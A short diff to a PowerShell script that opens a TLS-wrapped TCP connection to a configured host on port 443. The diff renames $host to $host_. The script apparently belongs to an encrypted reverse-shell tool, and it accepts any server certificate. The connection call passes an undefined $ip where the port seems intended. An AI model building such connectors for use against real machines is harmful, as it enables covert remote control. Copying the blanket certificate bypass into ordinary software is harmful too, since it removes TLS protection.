@@ -1,11 +1,11 @@
 ##### CONFIG #####
-$host = "127.0.0.1"
+$host_ = "127.0.0.1"
 $port = 443
 
 # Set TLS version
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls13
 $TCPClient = New-Object -TypeName System.Net.Sockets.TCPClient
-$TcpSocket = New-Object Net.Sockets.TcpClient($host,$ip)
+$TcpSocket = New-Object Net.Sockets.TcpClient($host_,$ip)
 $tcpstream = $TcpSocket.GetStream()
 # if the certificate is NOT self-signed you can comment the following line
 $Callback = {param($sender,$cert,$chain,$errors) return $true}
